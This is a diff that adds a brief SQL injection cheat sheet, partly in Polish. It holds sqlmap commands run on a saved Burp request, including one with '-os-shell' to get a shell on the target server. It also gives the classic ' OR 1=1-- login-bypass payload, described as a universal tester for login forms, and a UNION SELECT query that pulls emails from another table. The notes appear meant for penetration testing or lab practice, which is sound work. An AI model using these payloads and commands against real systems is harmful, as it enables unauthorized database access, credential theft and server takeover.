@@ -1,0 +1,29 @@
+
+SQLi
+Burp - save request, then:
+sqlmap -r ./request -p email -all
+sqlmap -r ./request -p email -os-shell
+
+
+
+
+SELECT * FROM accounts WHERE username='admin' AND password='a' or 1=1 -- dsfsdfsdfdfs
+
+
+-- Spacja po komentarzu!
+-- Uniwersalny tester okien logowania (operatory logiczne działają tak samo wszędzie)
+
+-- ' OR 1=1--
+
+
+
+-- Doklejanie komend sql UNION SELECT
+
+SELECT * FROM accounts WHERE username='adrian' UNION SELECT email FROM email_db.email WHERE username='adrian' -- AND PASSWORD
+
+
+
+MYSQL
+information_schema
+
+TABLES
